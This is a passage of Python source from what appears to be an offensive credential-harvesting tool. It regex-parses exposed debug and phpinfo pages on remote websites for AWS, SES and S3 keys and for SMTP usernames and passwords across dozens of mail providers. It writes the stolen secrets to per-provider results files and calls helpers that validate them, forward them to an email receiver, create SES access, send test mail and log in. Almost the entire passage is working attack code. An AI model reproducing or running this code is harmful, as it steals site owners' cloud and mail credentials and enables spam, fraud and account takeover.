						aws_key = reg('AWS_S3_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_S3_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SES_KEY" in text:
				if "AWS_SES_KEY" in text:
					method = '/.env'
					try:
					   aws_key = reg('AWS_SES_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SES_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg('AWS_SES_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SES_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY" in text:
					method = '/.env'
					try:
					   aws_key = reg('SES_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('SES_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg('SES_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('SES_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=email_receiver)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_KEY" in str(text):
				if "AWS_KEY" in str(text):
					method = '/.env'
					try:
					   aws_key = reg('AWS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID_2</td>" in text:
					method = 'debug'
					try:
					   aws_key = reg('AWS_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('AWS_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=email_receiver)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True

			elif "S3_KEY" in str(text):
				if "S3_KEY" in str(text):
					method = '/.env'
					try:
					   aws_key = reg('S3_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('S3_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>WAS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
					   aws_key = reg('S3_KEY.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg('S3_SECRET.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion3().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=email_receiver)
					autocreateses2(url,aws_key,aws_sec,aws_reg)
					ceker_aws3(url,aws_key,aws_sec,aws_reg)
					build_forchecker = cleanit(str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg))
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open('Result(Yii)/Apache(AWS).txt','a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			else:
				if "AKIA" in str(text):
					save = open('Result(Yii)/AKIA.txt','a')
					save.write(str(url)+'/_profiler/phpinfo\n')
					save.close()
				return False
		except:
			return False
	def get_smtp(self, text, url):
		oke = 0
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST" in text:
					method = '/.env'
					mailhost = reg('MAIL_HOST.*<td class="v">(.*?)</td></tr>', text)[0]
					mailport = reg('MAIL_PORT.*<td class="v">(.*?)</td></tr>', text)[0]
					mailuser = reg('MAIL_USERNAME.*<td class="v">(.*?)</td></tr>', text)[0]
					mailpass = reg('MAIL_PASSWORD.*<td class="v">(.*?)</td></tr>', text)[0]
					try:
						mailfrom = reg('MAIL_FROM_ADDRESS.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg('MAIL_FROM_NAME.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						fromname = ''
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('MAIL_HOST.*<td class="v">(.*?)</td></tr>', text)[0]
					mailport = reg('MAIL_PORT.*<td class="v">(.*?)</td></tr>', text)[0]
					mailuser = reg('MAIL_USERNAME.*<td class="v">(.*?)</td></tr>', text)[0]
					mailpass = reg('MAIL_PASSWORD.*<td class="v">(.*?)</td></tr>', text)[0]
					try:
						mailfrom = reg('MAIL_FROM_ADDRESS.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg('MAIL_FROM_NAME.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						fromname = ''
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					satu = cleanit(mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass)
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = str(mailuser)+':'+str(mailpass)+':'+str(mailhost)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Result(Yii)/SMTP(AWS).txt', 'a')
						save2.write(remover+'\n')
						save2.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
					elif 'sendgrid' in mailhost:
						build = str(mailuser)+':'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(SENDGRID).txt', 'a')
						save.write(remover+'\n')
						save.close()
						ceker_sendgrid2(url, mailpass)
						build_forchecker = str(mailhost)+":"+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover2 = str(build_forchecker).replace('\r', '')
						save3 = open('Result(Yii)/forchecker/sendgrid.txt','a')
						save3.write(remover2+'\n')
						save3.close()
						ceker_sendgrid2(url, mailpass)
					elif 'office365' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(OFFICE365).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '1and1' in mailhost or '1und1' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(1AND1).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'zoho' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(ZOHO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mandrillapp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(MANDRILL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mailgun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(MAILGUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(ITALY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'emailsrvr' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(RACKSPACE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hostinger' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(HOSTINGER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.yandex' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(YANDEX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.OVH' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(OVH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.ionos' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(IONOS).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'zimbra' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(ZIMBRA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'kasserver.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(KASSASERVER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'smtp-relay.gmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'sparkpostmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(SPARKPOST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '.jp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(JAPAN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'gmoserver' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(GMO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1

					elif 'mailjet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(MAILJET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'gmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(GMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'googlemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(GOOGLEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'aruba.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(ARUBA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hetzner' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(HETZNER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '163' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(163).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif '263' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(263).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'Aliyun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(ALIYUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'att.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(ATTNET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'chinaemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(CHINAEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'comcast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(COMCAST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'cox.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(COX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'earthlink' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(EARTH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'global-mail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(GLOBAL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'gmx' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(GMX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'godaddy' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(GODADDY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hinet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(HINET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'hotmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mail.ru' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(MAILRU).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mimecast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'mweb' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(MWEB).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'netease' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(NETEASE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
						smtp_login(text, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],
								   satu.split('|')[4])
						oke += 1
					elif 'NetworkSolutions' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Result(Yii)/SMTP(NETWORK).txt', 'a')
						save.write(remover+'\n')
						save.close()
